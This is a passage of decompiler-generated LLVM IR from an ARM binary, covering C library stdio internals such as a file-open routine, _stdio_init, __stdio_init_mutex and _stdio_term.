  store i32 %v1_ff38, i32* %r2.global-to-local, align 4
  %v0_ff3c = load i32, i32* @r6, align 4
  %v1_ff3c = add i32 %v0_ff3c, 1
  %v2_ff40 = and i32 %v1_ff3c, %v1_ff38
  store i32 %v2_ff40, i32* %r3.global-to-local, align 4
  %v9_ff44 = icmp eq i32 %v2_ff40, %v1_ff38
  %v1_ff48 = load i32, i32* @sb, align 4
  %v2_ff48 = add i32 %v1_ff48, 4
  %v3_ff48 = inttoptr i32 %v2_ff48 to i32*
  store i32 %v0_ff80, i32* %v3_ff48, align 4
  br i1 %v9_ff44, label %dec_label_pc_ff50, label %dec_label_pc_fea8

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff30
  %v0_ff50 = load i32, i32* @r4, align 4
  %v1_ff50 = load i32, i32* @r6, align 4
  %v2_ff50 = sub i32 -1, %v1_ff50
  %v3_ff50 = and i32 %v0_ff50, %v2_ff50
  store i32 %v3_ff50, i32* @r3, align 4
  %v1_ff54 = and i32 %v3_ff50, 1024
  %v2_ff54 = icmp eq i32 %v1_ff54, 0
  br i1 %v2_ff54, label %dec_label_pc_ff74, label %dec_label_pc_ff5c

dec_label_pc_ff5c:                                ; preds = %dec_label_pc_ff50
  %v0_ff5c = load i32, i32* @r5, align 4
  store i32 %v0_ff5c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_ff68 = call i32 @__libc_fcntl(i32 %v0_ff5c, i32 4)
  store i32 %v2_ff68, i32* %r0.global-to-local, align 4
  %v2_ff6c = icmp eq i32 %v2_ff68, 0
  br i1 %v2_ff6c, label %dec_label_pc_ff5c.dec_label_pc_ff74_crit_edge, label %dec_label_pc_fea8

dec_label_pc_ff5c.dec_label_pc_ff74_crit_edge:    ; preds = %dec_label_pc_ff5c
  %v0_ff74.pre = load i32, i32* @r6, align 4
  %v0_ff78.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff5c.dec_label_pc_ff74_crit_edge, %dec_label_pc_ff50
  %v0_ff78 = phi i32 [ %v0_ff78.pre, %dec_label_pc_ff5c.dec_label_pc_ff74_crit_edge ], [ %v0_ff50, %dec_label_pc_ff50 ]
  %v0_ff74 = phi i32 [ %v0_ff74.pre, %dec_label_pc_ff5c.dec_label_pc_ff74_crit_edge ], [ %v1_ff50, %dec_label_pc_ff50 ]
  %v1_ff74 = and i32 %v0_ff74, 131072
  store i32 %v1_ff74, i32* %r3.global-to-local, align 4
  %v2_ff78 = or i32 %v1_ff74, %v0_ff78
  store i32 %v2_ff78, i32* @r4, align 4
  br label %dec_label_pc_ffa4

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff28
  %v7_ff80 = icmp eq i32 %v0_ff80, -1
  %v0_ff8c.pre = load i32, i32* @r4, align 4
  br i1 %v7_ff80, label %dec_label_pc_ff80._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_ff80
  %v2_ff84 = or i32 %v0_ff8c.pre, 131072
  store i32 %v2_ff84, i32* @r4, align 4
  br label %dec_label_pc_ff80._crit_edge

dec_label_pc_ff80._crit_edge:                     ; preds = %dec_label_pc_ff80, %bb38
  %v0_ff8c = phi i32 [ %v2_ff84, %bb38 ], [ %v0_ff8c.pre, %dec_label_pc_ff80 ]
  %v0_ff88 = load i32, i32* @r6, align 4
  store i32 %v0_ff88, i32* %r0.global-to-local, align 4
  store i32 %v0_ff8c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_ff94 = call i32 @__GI_open(i32 %v0_ff88, i32 %v0_ff8c)
  store i32 %v2_ff94, i32* %r0.global-to-local, align 4
  %v1_ff98 = icmp slt i32 %v2_ff94, 0
  %v1_ff9c = load i32, i32* @sb, align 4
  %v2_ff9c = add i32 %v1_ff9c, 4
  %v3_ff9c = inttoptr i32 %v2_ff9c to i32*
  store i32 %v2_ff94, i32* %v3_ff9c, align 4
  br i1 %v1_ff98, label %dec_label_pc_febc, label %.dec_label_pc_ffa4_crit_edge

.dec_label_pc_ffa4_crit_edge:                     ; preds = %dec_label_pc_ff80._crit_edge
  %v0_ffa8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ffa4

dec_label_pc_ffa4:                                ; preds = %.dec_label_pc_ffa4_crit_edge, %dec_label_pc_ff74
  %v0_ffc0 = phi i32 [ %v0_ffa8.pre, %.dec_label_pc_ffa4_crit_edge ], [ %v2_ff78, %dec_label_pc_ff74 ]
  %v0_ffa4 = load i32, i32* @sb, align 4
  %v1_ffa4 = inttoptr i32 %v0_ffa4 to i16*
  %v2_ffa4 = load i16, i16* %v1_ffa4, align 2
  %v3_ffa4 = zext i16 %v2_ffa4 to i32
  %v1_ffa8 = urem i32 %v0_ffc0, 4
  %v1_ffac = and i32 %v0_ffc0, 1024
  %v1_ffb0 = and i32 %v3_ffa4, 8192
  %v1_ffb4 = add nuw nsw i32 %v1_ffa8, 1
  %v2_ffb8 = or i32 %v1_ffb0, %v1_ffac
  store i32 %v2_ffb8, i32* %r3.global-to-local, align 4
  %v1_ffbc = xor i32 %v1_ffb4, 3
  store i32 %v1_ffbc, i32* %r1.global-to-local, align 4
  %v1_ffc0 = and i32 %v0_ffc0, 131072
  store i32 %v1_ffc0, i32* %r2.global-to-local, align 4
  %v2_ffc0 = icmp eq i32 %v1_ffc0, 0
  %v1_ffc4 = add i32 %v0_ffa4, 4
  %v2_ffc4 = inttoptr i32 %v1_ffc4 to i32*
  %v3_ffc4 = load i32, i32* %v2_ffc4, align 4
  store i32 %v3_ffc4, i32* @r5, align 4
  br i1 %v2_ffc0, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_ffa4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ffa4, %bb39
  %v0_ffd0 = phi i32 [ 0, %dec_label_pc_ffa4 ], [ 32768, %bb39 ]
  %v4_ffcc = mul nuw nsw i32 %v1_ffbc, 16
  %v5_ffcc = or i32 %v2_ffb8, %v4_ffcc
  store i32 %v5_ffcc, i32* %r3.global-to-local, align 4
  %v2_ffd0 = or i32 %v0_ffd0, %v5_ffcc
  store i32 %v2_ffd0, i32* %r2.global-to-local, align 4
  %v8_ffd4 = icmp eq i32 %v3_ffc4, 2147483647
  %v1_ffd8 = trunc i32 %v2_ffd0 to i16
  store i16 %v1_ffd8, i16* %v1_ffa4, align 2
  br i1 %v8_ffd4, label %dec_label_pc_10008, label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %bb40
  %v0_ffe0 = call i32 @__GI___errno_location()
  store i32 %v0_ffe0, i32* @r4, align 4
  %v0_ffe8 = load i32, i32* @r5, align 4
  store i32 %v0_ffe8, i32* @r0, align 4
  %v1_ffec = inttoptr i32 %v0_ffe0 to i32*
  %v2_ffec = load i32, i32* %v1_ffec, align 4
  store i32 %v2_ffec, i32* @r5, align 4
  %v1_fff0 = call i32 @isatty(i32 %v0_ffe8)
  store i32 %v1_fff0, i32* %r0.global-to-local, align 4
  %v2_fff4 = icmp eq i32 %v1_fff0, 0
  br i1 %v2_fff4, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_ffe0
  %v1_fff8 = load i32, i32* @sb, align 4
  %v2_fff8 = inttoptr i32 %v1_fff8 to i16*
  %v3_fff8 = load i16, i16* %v2_fff8, align 2
  %v4_fff8 = zext i16 %v3_fff8 to i32
  %v2_fffc = or i32 %v4_fff8, 256
  store i32 %v2_fffc, i32* %r3.global-to-local, align 4
  %v2_10000 = trunc i32 %v2_fffc to i16
  store i16 %v2_10000, i16* %v2_fff8, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ffe0, %bb41
  %v0_10004 = load i32, i32* @r5, align 4
  %v1_10004 = load i32, i32* @r4, align 4
  %v2_10004 = inttoptr i32 %v1_10004 to i32*
  store i32 %v0_10004, i32* %v2_10004, align 4
  br label %dec_label_pc_10008

dec_label_pc_10008:                               ; preds = %bb40, %.thread7
  %v0_10008 = load i32, i32* @sb, align 4
  %v1_10008 = add i32 %v0_10008, 8
  %v2_10008 = inttoptr i32 %v1_10008 to i32*
  %v3_10008 = load i32, i32* %v2_10008, align 4
  store i32 %v3_10008, i32* %r3.global-to-local, align 4
  %v2_1000c = icmp eq i32 %v3_10008, 0
  br i1 %v2_1000c, label %dec_label_pc_10014, label %bb42

dec_label_pc_10014:                               ; preds = %dec_label_pc_10008
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_10018 = call i32 @malloc(i32 4096)
  store i32 %v1_10018, i32* %r0.global-to-local, align 4
  %v2_1001c = icmp eq i32 %v1_10018, 0
  %v1_1002c.pre = load i32, i32* @sb, align 4
  br i1 %v2_1001c, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_10014
  %v2_10020 = inttoptr i32 %v1_1002c.pre to i16*
  %v3_10020 = load i16, i16* %v2_10020, align 2
  %v4_10020 = zext i16 %v3_10020 to i32
  %v2_10024 = add i32 %v1_10018, 4096
  store i32 %v2_10024, i32* %r2.global-to-local, align 4
  %v2_10028 = or i32 %v4_10020, 16384
  store i32 %v2_10028, i32* %r3.global-to-local, align 4
  %v2_1002c = add i32 %v1_1002c.pre, 8
  %v3_1002c = inttoptr i32 %v2_1002c to i32*
  store i32 %v1_10018, i32* %v3_1002c, align 4
  %v1_10030 = load i32, i32* %r2.global-to-local, align 4
  %v2_10030 = load i32, i32* @sb, align 4
  %v3_10030 = add i32 %v2_10030, 12
  %v4_10030 = inttoptr i32 %v3_10030 to i32*
  store i32 %v1_10030, i32* %v4_10030, align 4
  %v1_10034 = load i32, i32* %r3.global-to-local, align 4
  %v2_10034 = trunc i32 %v1_10034 to i16
  %v3_10034 = load i32, i32* @sb, align 4
  %v4_10034 = inttoptr i32 %v3_10034 to i16*
  store i16 %v2_10034, i16* %v4_10034, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_10014
  %v2_1002c21 = add i32 %v1_1002c.pre, 8
  %v3_1002c22 = inttoptr i32 %v2_1002c21 to i32*
  store i32 0, i32* %v3_1002c22, align 4
  %v2_10038 = load i32, i32* @sb, align 4
  %v3_10038 = add i32 %v2_10038, 12
  %v4_10038 = inttoptr i32 %v3_10038 to i32*
  store i32 0, i32* %v4_10038, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_10008, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10044 = load i32, i32* @fp, align 4
  %v2_10044 = add i32 %v0_10044, 60
  %v3_10044 = inttoptr i32 %v2_10044 to i32*
  %v4_10044 = load i32, i32* %v3_10044, align 4
  store i32 %v4_10044, i32* %r3.global-to-local, align 4
  %v2_10048 = load i32, i32* @sb, align 4
  %v3_10048 = add i32 %v2_10048, 2
  %v4_10048 = inttoptr i32 %v3_10048 to i8*
  store i8 0, i8* %v4_10048, align 1
  %v0_1004c = load i32, i32* @sb, align 4
  %v1_1004c = inttoptr i32 %v0_1004c to i16*
  %v2_1004c = load i16, i16* %v1_1004c, align 2
  %v3_1004c = zext i16 %v2_1004c to i32
  store i32 %v3_1004c, i32* %r2.global-to-local, align 4
  %v0_10050 = load i32, i32* %r3.global-to-local, align 4
  %v1_10050 = inttoptr i32 %v0_10050 to i32*
  %v2_10050 = load i32, i32* %v1_10050, align 4
  store i32 %v2_10050, i32* %r1.global-to-local, align 4
  %v1_10054 = add i32 %v0_1004c, 8
  %v2_10054 = inttoptr i32 %v1_10054 to i32*
  %v3_10054 = load i32, i32* %v2_10054, align 4
  store i32 %v3_10054, i32* %r3.global-to-local, align 4
  %v1_10058 = and i32 %v3_1004c, 8192
  %v2_10058 = icmp eq i32 %v1_10058, 0
  %v2_1005c = add i32 %v0_1004c, 20
  %v3_1005c = inttoptr i32 %v2_1005c to i32*
  store i32 %v3_10054, i32* %v3_1005c, align 4
  %v0_10060 = load i32, i32* %r0.global-to-local, align 4
  %v1_10060 = load i32, i32* @sb, align 4
  %v2_10060 = add i32 %v1_10060, 44
  %v3_10060 = inttoptr i32 %v2_10060 to i32*
  store i32 %v0_10060, i32* %v3_10060, align 4
  %v0_10064 = load i32, i32* %r1.global-to-local, align 4
  %v1_10064 = load i32, i32* @sb, align 4
  %v2_10064 = add i32 %v1_10064, 52
  %v3_10064 = inttoptr i32 %v2_10064 to i32*
  store i32 %v0_10064, i32* %v3_10064, align 4
  %v0_10068 = load i32, i32* %r3.global-to-local, align 4
  %v1_10068 = load i32, i32* @sb, align 4
  %v2_10068 = add i32 %v1_10068, 24
  %v3_10068 = inttoptr i32 %v2_10068 to i32*
  store i32 %v0_10068, i32* %v3_10068, align 4
  %v0_1006c = load i32, i32* %r3.global-to-local, align 4
  %v1_1006c = load i32, i32* @sb, align 4
  %v2_1006c = add i32 %v1_1006c, 28
  %v3_1006c = inttoptr i32 %v2_1006c to i32*
  store i32 %v0_1006c, i32* %v3_1006c, align 4
  %v0_10070 = load i32, i32* %r3.global-to-local, align 4
  %v1_10070 = load i32, i32* @sb, align 4
  %v2_10070 = add i32 %v1_10070, 16
  %v3_10070 = inttoptr i32 %v2_10070 to i32*
  store i32 %v0_10070, i32* %v3_10070, align 4
  br i1 %v2_10058, label %dec_label_pc_1012c, label %dec_label_pc_10078

dec_label_pc_10078:                               ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1007c = load i32, i32* @fp, align 4
  %v2_1007c = add i32 %v0_1007c, 36
  %v3_1007c = inttoptr i32 %v2_1007c to i32*
  %v4_1007c = load i32, i32* %v3_1007c, align 4
  store i32 %v4_1007c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_10084 = add i32 %v0_1007c, 112
  %v3_10084 = inttoptr i32 %v2_10084 to i32*
  %v4_10084 = load i32, i32* %v3_10084, align 4
  store i32 %v4_10084, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1008c = ptrtoint i32* %stack_var_-56 to i32
  %v2_10090 = add i32 %v0_1007c, 76
  %v3_10090 = inttoptr i32 %v2_10090 to i32*
  %v4_10090 = load i32, i32* %v3_10090, align 4
  store i32 %v4_1007c, i32* %r1.global-to-local, align 4
  store i32 %v4_10084, i32* %r2.global-to-local, align 4
  store i32 %v2_1008c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10090)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_100ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_100ac, i32* %r0.global-to-local, align 4
  %v0_100b0 = load i32, i32* @fp, align 4
  %v2_100b0 = add i32 %v0_100b0, 16
  %v3_100b0 = inttoptr i32 %v2_100b0 to i32*
  %v4_100b0 = load i32, i32* %v3_100b0, align 4
  call void @__pseudo_branch(i32 %v4_100b0)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_100c0 = load i32, i32* @fp, align 4
  %v2_100c0 = add i32 %v0_100c0, 100
  %v3_100c0 = inttoptr i32 %v2_100c0 to i32*
  %v4_100c0 = load i32, i32* %v3_100c0, align 4
  store i32 %v4_100c0, i32* %r4.global-to-local, align 4
  %v0_100c4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_100c4, i32* %r1.global-to-local, align 4
  store i32 %v4_100c0, i32* %r2.global-to-local, align 4
  store i32 %v2_fe7c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10090)
  store i32 %v4_100c0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_100b0)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_100e8 = load i32, i32* @fp, align 4
  %v2_100e8 = add i32 %v0_100e8, 48
  %v3_100e8 = inttoptr i32 %v2_100e8 to i32*
  %v4_100e8 = load i32, i32* %v3_100e8, align 4
  store i32 %v4_100e8, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_100f0 = inttoptr i32 %v4_100e8 to i32*
  %v2_100f0 = load i32, i32* %v1_100f0, align 4
  store i32 %v2_100f0, i32* %r2.global-to-local, align 4
  store i32 %v2_fe7c, i32* %r0.global-to-local, align 4
  %v1_100f8 = load i32, i32* @sb, align 4
  %v2_100f8 = add i32 %v1_100f8, 32
  %v3_100f8 = inttoptr i32 %v2_100f8 to i32*
  store i32 %v2_100f0, i32* %v3_100f8, align 4
  %v0_100fc = load i32, i32* @fp, align 4
  %v1_100fc = load i32, i32* %r3.global-to-local, align 4
  %v2_100fc = add i32 %v1_100fc, %v0_100fc
  %v3_100fc = inttoptr i32 %v2_100fc to i32*
  %v4_100fc = load i32, i32* %v3_100fc, align 4
  store i32 %v4_100fc, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10104 = load i32, i32* @sb, align 4
  %v1_10104 = load i32, i32* @ip, align 4
  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  store i32 %v0_10104, i32* %v2_10104, align 4
  call void @__pseudo_branch(i32 %v4_100fc)
  store i32 %v2_1008c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_100fc)
  br label %dec_label_pc_1012c

dec_label_pc_10128:                               ; preds = %dec_label_pc_febc, %dec_label_pc_fea8, %dec_label_pc_fec8
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %bb42, %dec_label_pc_ff00, %dec_label_pc_10078, %dec_label_pc_10128
  %v0_1012c = load i32, i32* @sb, align 4
  store i32 %v0_1012c, i32* %r0.global-to-local, align 4
  %v2_10134 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10134, i32* @r4, align 4
  store i32 %v6_fe68, i32* @r5, align 4
  store i32 %v9_fe68, i32* @r6, align 4
  store i32 %v18_fe68, i32* @sb, align 4
  store i32 %v24_fe68, i32* @fp, align 4
  ret i32 %v0_1012c

; uselistorder directives
  uselistorder i32 %v1_1002c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_ffc0, { 1, 2, 0 }
  uselistorder i32 %v0_ff8c, { 1, 0 }
  uselistorder i32 %v1_ff50, { 1, 0 }
  uselistorder i32 %v0_ff50, { 1, 0 }
  uselistorder i32 %v1_ff38, { 1, 0, 2 }
  uselistorder i32 %v1_fef0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1012c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10128, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_ff80._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ff28, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_fed8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fea8, { 1, 2, 0 }
}

define i32 @function_10140(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10140:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10140 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10140, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_10140
  %v3_10148 = and i32 %arg4, %arg3
  %v2_1014c = trunc i32 %v3_10148 to i16
  %v4_1014c = inttoptr i32 %v3_10148 to i16*
  store i16 %v2_1014c, i16* %v4_1014c, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_10140, %bb
  %v10_1016c = phi i32 [ %tmp, %dec_label_pc_10140 ], [ 0, %bb ]
  ret i32 %v10_1016c

; uselistorder directives
  uselistorder i32 %v3_10148, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10174 = call i32 @__GI___errno_location()
  store i32 %v0_10174, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_10180 = inttoptr i32 %v0_10174 to i32*
  %v2_10180 = load i32, i32* %v1_10180, align 4
  store i32 %v2_10180, i32* @r6, align 4
  %v1_10184 = call i32 @isatty(i32 0)
  %v2_1018c = icmp eq i32 %v1_10184, 0
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  br i1 %v2_1018c, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_10198 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3616) to i16*), align 4
  %v7_10198 = zext i16 %v5_10198 to i32
  %v2_1019c = xor i32 %v7_10198, 256
  store i32 %v2_1019c, i32* @r3, align 4
  %v2_101a0 = trunc i32 %v2_1019c to i16
  store i16 %v2_101a0, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3616) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_101a8 = call i32 @isatty(i32 1)
  %v2_101ac = icmp eq i32 %v1_101a8, 0
  br i1 %v2_101ac, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_101b4 = load i32, i32* @r4, align 4
  %v2_101b8 = add i32 %v1_101b4, 3696
  %v3_101b8 = inttoptr i32 %v2_101b8 to i16*
  %v4_101b8 = load i16, i16* %v3_101b8, align 2
  %v2_101bc = xor i16 %v4_101b8, 256
  store i16 %v2_101bc, i16* %v3_101b8, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_101c4 = load i32, i32* @r6, align 4
  %v1_101c4 = load i32, i32* @r5, align 4
  %v2_101c4 = inttoptr i32 %v1_101c4 to i32*
  store i32 %v0_101c4, i32* %v2_101c4, align 4
  ret i32 %v1_101a8

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -37084), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_101f4 = call i32 @memcpy()
  ret i32 %v0_101f4
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1020c = load i32, i32* @r4, align 4
  store i32 %v3_1020c, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r6.global-to-local, align 4
  %v4_1021c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 100) to i32*), align 4
  store i32 %v4_1021c, i32* @r0, align 4
  %v1_10220 = call i32 @__stdio_init_mutex(i32 %v4_1021c)
  store i32 %v1_10220, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10228 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 112) to i32*), align 4
  store i32 %v4_10228, i32* @r0, align 4
  %v1_1022c = call i32 @__stdio_init_mutex(i32 %v4_10228)
  store i32 %v1_1022c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_10234 = load i32, i32* %r6.global-to-local, align 4
  %v2_10234 = add i32 %v0_10234, 48
  %v3_10234 = inttoptr i32 %v2_10234 to i32*
  %v4_10234 = load i32, i32* %v3_10234, align 4
  store i32 %v4_10234, i32* %r3.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  %v1_1023c = inttoptr i32 %v4_10234 to i32*
  %v2_1023c = load i32, i32* %v1_1023c, align 4
  store i32 %v2_1023c, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_102885 = add i32 %v2_1023c, 56
  store i32 %v1_102885, i32* @r5, align 4
  %v2_1028c7 = icmp eq i32 %v2_1023c, 0
  store i32 %v1_102885, i32* %r0.global-to-local, align 4
  br i1 %v2_1028c7, label %dec_label_pc_10298, label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %entry, %dec_label_pc_1027c.dec_label_pc_10248_crit_edge
  %v1_10248 = phi i32 [ %v1_10248.pre, %dec_label_pc_1027c.dec_label_pc_10248_crit_edge ], [ 44, %entry ]
  %v0_10248 = phi i32 [ %v0_1029c.pre, %dec_label_pc_1027c.dec_label_pc_10248_crit_edge ], [ %v0_10234, %entry ]
  %v2_10248 = add i32 %v0_10248, %v1_10248
  %v3_10248 = inttoptr i32 %v2_10248 to i32*
  %v4_10248 = load i32, i32* %v3_10248, align 4
  store i32 %v4_10248, i32* @ip, align 4
  store i32 66132, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10248)
  %v0_10254 = load i32, i32* %r0.global-to-local, align 4
  %v2_10254 = icmp eq i32 %v0_10254, 0
  %v0_10258 = load i32, i32* @r5, align 4
  store i32 %v0_10258, i32* @r0, align 4
  br i1 %v2_10254, label %dec_label_pc_1027c, label %dec_label_pc_10260

dec_label_pc_10260:                               ; preds = %dec_label_pc_10248
  %v0_10260 = load i32, i32* @r4, align 4
  %v1_10260 = add i32 %v0_10260, 8
  %v2_10260 = inttoptr i32 %v1_10260 to i32*
  %v3_10260 = load i32, i32* %v2_10260, align 4
  store i32 %v3_10260, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_10268 = add i32 %v0_10260, 20
  %v3_10268 = inttoptr i32 %v2_10268 to i32*
  store i32 %v3_10260, i32* %v3_10268, align 4
  %v0_1026c = load i32, i32* %r2.global-to-local, align 4
  %v1_1026c = trunc i32 %v0_1026c to i16
  %v2_1026c = load i32, i32* @r4, align 4
  %v3_1026c = inttoptr i32 %v2_1026c to i16*
  store i16 %v1_1026c, i16* %v3_1026c, align 2
  %v0_10270 = load i32, i32* %r3.global-to-local, align 4
  %v1_10270 = load i32, i32* @r4, align 4
  %v2_10270 = add i32 %v1_10270, 24
  %v3_10270 = inttoptr i32 %v2_10270 to i32*
  store i32 %v0_10270, i32* %v3_10270, align 4
  %v0_10274 = load i32, i32* %r3.global-to-local, align 4
  %v1_10274 = load i32, i32* @r4, align 4
  %v2_10274 = add i32 %v1_10274, 28
  %v3_10274 = inttoptr i32 %v2_10274 to i32*
  store i32 %v0_10274, i32* %v3_10274, align 4
  %v0_10278 = load i32, i32* %r3.global-to-local, align 4
  %v1_10278 = load i32, i32* @r4, align 4
  %v2_10278 = add i32 %v1_10278, 16
  %v3_10278 = inttoptr i32 %v2_10278 to i32*
  store i32 %v0_10278, i32* %v3_10278, align 4
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10248, %dec_label_pc_10260
  %v0_1027c = load i32, i32* %r7.global-to-local, align 4
  %v1_1027c = load i32, i32* @r4, align 4
  %v2_1027c = add i32 %v1_1027c, 52
  %v3_1027c = inttoptr i32 %v2_1027c to i32*
  store i32 %v0_1027c, i32* %v3_1027c, align 4
  %v1_10280 = call i32 @__stdio_init_mutex(i32 %v0_10258)
  store i32 %v1_10280, i32* %r0.global-to-local, align 4
  %v0_10284 = load i32, i32* @r4, align 4
  %v1_10284 = add i32 %v0_10284, 32
  %v2_10284 = inttoptr i32 %v1_10284 to i32*
  %v3_10284 = load i32, i32* %v2_10284, align 4
  store i32 %v3_10284, i32* @r4, align 4
  %v1_10288 = add i32 %v3_10284, 56
  store i32 %v1_10288, i32* @r5, align 4
  %v2_1028c = icmp eq i32 %v3_10284, 0
  store i32 %v1_10288, i32* %r0.global-to-local, align 4
  %v0_1029c.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_1028c, label %dec_label_pc_10298, label %dec_label_pc_1027c.dec_label_pc_10248_crit_edge

dec_label_pc_1027c.dec_label_pc_10248_crit_edge:  ; preds = %dec_label_pc_1027c
  %v1_10248.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10248

dec_label_pc_10298:                               ; preds = %dec_label_pc_1027c, %entry
  %v1_102c814 = phi i32 [ %v1_102885, %entry ], [ %v1_10288, %dec_label_pc_1027c ]
  %v0_1029c = phi i32 [ %v0_10234, %entry ], [ %v0_1029c.pre, %dec_label_pc_1027c ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_1029c = add i32 %v0_1029c, 48
  %v3_1029c = inttoptr i32 %v2_1029c to i32*
  %v4_1029c = load i32, i32* %v3_1029c, align 4
  store i32 %v4_1029c, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_1029c to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
